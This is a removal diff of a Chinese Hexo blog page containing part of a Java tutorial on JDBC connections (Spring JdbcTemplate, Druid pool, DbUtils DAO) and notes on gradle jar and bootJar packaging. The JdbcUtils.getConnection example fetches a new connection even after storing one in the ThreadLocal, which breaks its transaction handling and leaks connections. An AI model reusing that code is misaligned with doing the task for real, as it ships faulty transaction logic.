class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">	 <span class="comment">&lt;!--配置jdbc的bean,并引用datasource--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;jdbcTemplate&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.core.JdbcTemplate&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--扫描注解--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.jinlei&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>step3.将配置文件导入web.xml中</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="line">         version=<span class="string">&quot;4.0&quot;</span>&gt;</span><br><span class="line">    &lt;!--配置全局初始参数,用于初始化时将配置文件加载进去--&gt;</span><br><span class="line">    &lt;context-param&gt;</span><br><span class="line">        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt;</span><br><span class="line">    &lt;/context-param&gt;         </span><br><span class="line"> &lt;/web-app&gt;            </span><br></pre></td></tr></table></figure>
-
-<p>step4.使用jdbctemplate进行sql查询</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDaoImpl</span> <span class="keyword">implements</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findByUsernameAndPassworc</span><span class="params">(String username, String password)</span> </span>&#123;</span><br><span class="line">        User user= jdbcTemplate.queryForObject(<span class="string">&quot;select * from sys_user where username=?&quot;</span> +<span class="string">&quot; and password=?&quot;</span>, <span class="keyword">new</span> BeanPropertyRowMapper&lt;User&gt;(User.class),username,password);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="手动连接"><a href="#手动连接" class="headerlink" title="手动连接"></a>手动连接</h1><p>step1.创建jdbc.properties文件,写入连接数据库的驱动,url,等</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=<span class="number">123456</span></span><br><span class="line">url=jdbc:mysql:<span class="comment">//localhost:3306/book</span></span><br><span class="line">driverClassName=com.mysql.jdbc.Driver</span><br></pre></td></tr></table></figure>
-
-<p>step2.手动创建datasource并声明连接和关闭方式</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DruidDataSource dataSource;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ThreadLocal&lt;Connection&gt; conns=<span class="keyword">new</span> ThreadLocal&lt;Connection&gt;();</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Properties properties=<span class="keyword">new</span> Properties();<span class="comment">//new数据库连接池中的Properties类</span></span><br><span class="line"><span class="comment">//  getResourceAsStream()方法只读取工程路径下的文件,之后用于读取jdbc.properties属性配置文件</span></span><br><span class="line">            InputStream inputStream = JdbcUtils.class.getClassLoader().getResourceAsStream(<span class="string">&quot;jdbc.properties&quot;</span>);</span><br><span class="line">            <span class="comment">//从将配置文件流加载进Properties类对象中</span></span><br><span class="line">            properties.load(inputStream);</span><br><span class="line">            <span class="comment">//再把Properties类传入Druid数据池中</span></span><br><span class="line">            dataSource= (DruidDataSource) DruidDataSourceFactory.createDataSource(properties);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取数据库连接池中的连接</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果返回null,说明获取连接失败,有值就是获取成功</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span></span>&#123;</span><br><span class="line">       Connection conn=conns.get();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (conn==<span class="keyword">null</span>)&#123;</span><br><span class="line">                conn=dataSource.getConnection();</span><br><span class="line">                conns.set(conn);</span><br><span class="line">                conn.setAutoCommit(<span class="keyword">false</span>);<span class="comment">//设置手动管理事务</span></span><br><span class="line">            &#125;</span><br><span class="line">            conn=dataSource.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提交事务,并关闭释放连接</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">commitAndClose</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Connection connection=conns.get();</span><br><span class="line">        <span class="keyword">if</span> (connection!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                connection.commit();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    connection.close();<span class="comment">//关闭连接</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        conns.remove();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 回滚事务,并关闭释放连接</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rollbackAndClose</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Connection connection=conns.get();</span><br><span class="line">    <span class="keyword">if</span> (connection!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            connection.rollback();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                connection.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    conns.remove();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>step3.先声明各种查询方式</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseDao</span> </span>&#123;</span><br><span class="line">    <span class="comment">//使用DbUtils操作数据库</span></span><br><span class="line">    <span class="keyword">private</span> QueryRunner queryRunner=<span class="keyword">new</span> QueryRunner();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * update()方法用来执行:insert/update/delete语句</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果返回-1,说明执行失败;返回正常数字,数字代表更新的行数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">update</span><span class="params">(String sql,Object ... args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;BaseDao程序在[&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">        Connection connection = JdbcUtils.getConnection();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> queryRunner.update(connection,sql,args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> type</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sql</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> &lt;T&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">T  <span class="title">queryForOne</span><span class="params">(Class&lt;T&gt; type,String sql,Object...args)</span></span>&#123;</span><br><span class="line">        Connection conn= JdbcUtils.getConnection();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> queryRunner.query(conn, sql,<span class="keyword">new</span> BeanHandler&lt;T&gt;(type),args );</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">List&lt;T&gt; <span class="title">queryForList</span><span class="params">(Class&lt;T&gt; type,String sql,Object...args)</span></span>&#123;</span><br><span class="line">        Connection conn= JdbcUtils.getConnection();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> queryRunner.query(conn, sql,<span class="keyword">new</span> BeanListHandler&lt;T&gt;(type),args );</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 执行返回一行一列的sql语句</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sql 执行sql语句</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args sql的参数值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">queryForSinglevalue</span><span class="params">(String sql,Object...args)</span></span>&#123;</span><br><span class="line">        Connection conn= JdbcUtils.getConnection();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> queryRunner.query(conn, sql,<span class="keyword">new</span> ScalarHandler(),args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>step4.利用刚刚写的方法,进行针对性查询</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookDaoImpl</span> <span class="keyword">extends</span> <span class="title">BaseDao</span> <span class="keyword">implements</span> <span class="title">BookDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addBook</span><span class="params">(Book book)</span> </span>&#123;</span><br><span class="line">        String sql = <span class="string">&quot;insert into t_book(`name`,author,price,sales,stock,img_path)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;values(?,?,?,?,?,?)&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> update(sql, book.getName(), book.getAuthor(), book.getPrice(),</span><br><span class="line">                book.getSales(), book.getStock(), book.getImgPath());</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Book <span class="title">queryBookById</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        String sql=<span class="string">&quot;select id,`name`,author,price,sales,stock,img_path from&quot;</span> +</span><br><span class="line">                <span class="string">&quot; t_book where id=?&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> queryForOne(Book.class, sql, id);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/java//" class="article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/08/%E8%AE%BAjava%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-build-gradle知识点" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/04/build-gradle%E7%9F%A5%E8%AF%86%E7%82%B9/">build.gradle知识点</a>
-    </h1>
-  
-
-        
-        <a href="/2021/12/04/build-gradle%E7%9F%A5%E8%AF%86%E7%82%B9/" class="archive-article-date">
-  	<time datetime="2021-12-04T08:23:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="dependecies中implementation和compile的区别"><a href="#dependecies中implementation和compile的区别" class="headerlink" title="dependecies中implementation和compile的区别"></a>dependecies中implementation和compile的区别</h3><p>都是引入外界的依赖,唯一的区别是,当自己的项目打包成jar包后,别人引入你的jar包后,查看你的代码:</p>
-<p>当你用implementation,你的代码中引入的依赖类,别人就不能访问查看细节</p>
-<p>当你用compile,你的代码中引入的依赖类,别人就能访问查看细节</p>
-<h3 id="本地jar包如何引用-不推荐api方式"><a href="#本地jar包如何引用-不推荐api方式" class="headerlink" title="本地jar包如何引用,不推荐api方式"></a>本地jar包如何引用,不推荐api方式</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile fileTree(<span class="attr">dir:</span><span class="string">&#x27;src/libs&#x27;</span>,<span class="attr">include:</span>[<span class="string">&#x27;*.jar&#x27;</span>])</span><br></pre></td></tr></table></figure>
-
-<p>不能把compile改成api,即使compile语法已经在7.0中被弃用了,但是在测试6.7版本中,必须使用compile,否则打包的时候无法将本地jar包打包进去</p>
-<h3 id="provided关键词"><a href="#provided关键词" class="headerlink" title="provided关键词"></a>provided关键词</h3><p>附有provided关键词,则该依赖不会打包进war包</p>
-<h3 id="bootjar与jar打包插件"><a href="#bootjar与jar打包插件" class="headerlink" title="bootjar与jar打包插件"></a>bootjar与jar打包插件</h3><p>注意:使用了bootjar或者jar打包插件后,使用传统jar包打包流程,build/libs底下不会生成jar包,即<strong>传统流程失效</strong></p>
-<p><strong>传统jar包,打包流程:</strong></p>
-<p>gradle clean </p>
-<p>gradle build -x test</p>
-<p>之后去build/libs底下即可找到jar包</p>
-<p>传统jar包打包方式,会将配置文件,依赖的libs包统统打包进jar包,使得jar包比较臃肿</p>
-<p>bootjar是一种打包插件</p>
-<p>打包方式是将配置文件和依赖的libs包分离出来放在两个文件夹中,只将自己的代码打包成jar包,.</p>
-<p>代码结构如下:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-dist</span><br><span class="line">    -config</span><br><span class="line">    -lib</span><br><span class="line">    key-core-web.jar</span><br></pre></td></tr></table></figure>
-
-
-
-<p>bootjar的好处:可以直接在文件外面改配置文件如application.properties,坏处是只适合本地使用,不适合交付服务器环境</p>
-<p>当然你也可以将一整个dist文件夹传给别人</p>
-<p>bootjar在gradle中的配置如下</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">bootJar &#123;</span><br><span class="line">    <span class="comment">//指放在根目录哪个文件夹下</span></span><br><span class="line">    destinationDir file(<span class="string">&#x27;dist&#x27;</span>)</span><br><span class="line">    <span class="comment">//指打包的jar包名字</span></span><br><span class="line">    archiveName project.name  + <span class="string">&#x27;.jar&#x27;</span></span><br><span class="line">    <span class="comment">//从哪个目录下打包源码,排除一切.xml文件</span></span><br><span class="line">    from(<span class="string">&#x27;src/main/java&#x27;</span>)&#123;</span><br><span class="line">        include <span class="string">&#x27;**/*.xml&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//排除一切properties,yml后缀的文件</span></span><br><span class="line">    exclude <span class="string">&#x27;**/*.properties&#x27;</span></span><br><span class="line">    exclude <span class="string">&#x27;**/*.yml&#x27;</span></span><br><span class="line">    <span class="comment">//最后,从以下目录中复制文件到指定目录</span></span><br><span class="line">    doLast &#123;</span><br><span class="line">        copy &#123;</span><br><span class="line">            from file(<span class="string">&#x27;tools/&#x27;</span>)</span><br><span class="line">            into <span class="string">&#x27;dist/&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        copy &#123;</span><br><span class="line">            from file(<span class="string">&#x27;src/main/tools/&#x27;</span>)</span><br><span class="line">            into <span class="string">&#x27;dist&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将runtimec的包放入lib中</span></span><br><span class="line">        copy &#123;</span><br><span class="line">            from configurations.runtime</span><br><span class="line">            into <span class="string">&#x27;dist/lib&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        copy &#123;</span><br><span class="line">            from file(<span class="string">&#x27;src/main/resources/application.properties&#x27;</span>)</span><br><span class="line">            into <span class="string">&#x27;dist/config/&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        copy &#123;</span><br><span class="line">            from file(<span class="string">&#x27;.&#x27;</span>).listFiles().findAll&#123;File f -&gt; (f.name.endsWith(<span class="string">&#x27;.crt&#x27;</span>) || f.name.endsWith(<span class="string">&#x27;.keystore&#x27;</span>))&#125;</span><br><span class="line">            into <span class="string">&#x27;dist/config&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        copy &#123;</span><br><span class="line">            from file(<span class="string">&#x27;config/contract/&#x27;</span>)</span><br><span class="line">            into <span class="string">&#x27;dist/config/contract&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>另外还有一种jar打包插件,功能同上述类似</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">jar &#123;</span><br><span class="line">    enabled = <span class="literal">true</span></span><br><span class="line">    destinationDir file(<span class="string">&#x27;dist&#x27;</span>)</span><br><span class="line">    archiveName project.name + <span class="string">&#x27;.jar&#x27;</span></span><br><span class="line">    exclude <span class="string">&#x27;**/*.xml&#x27;</span></span><br><span class="line">    exclude <span class="string">&#x27;**/*.properties&#x27;</span></span><br><span class="line">    exclude <span class="string">&#x27;**/*.yml&#x27;</span></span><br><span class="line"></span><br><span class="line">    doLast &#123;</span><br><span class="line">        copy &#123;</span><br><span class="line">            from file(<span class="string">&#x27;src/main/resources/&#x27;</span>)</span><br><span class="line">            into <span class="string">&#x27;dist/config&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        copy &#123;</span><br><span class="line">            from configurations.runtime</span><br><span class="line">            into <span class="string">&#x27;dist/lib&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="使用bootjar或者jar插件-依赖没有打包到dist-lib目录中"><a href="#使用bootjar或者jar插件-依赖没有打包到dist-lib目录中" class="headerlink" title="使用bootjar或者jar插件,依赖没有打包到dist/lib目录中"></a>使用bootjar或者jar插件,依赖没有打包到dist/lib目录中</h3><p>如果你使用的是以下语句</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy &#123;</span><br><span class="line">            from configurations.runtime</span><br><span class="line">            into <span class="string">&#x27;dist/lib&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>请改成</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy &#123;</span><br><span class="line">            from configurations.runtimeClasspath.files</span><br><span class="line">            into <span class="string">&#x27;dist/lib&#x27;</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
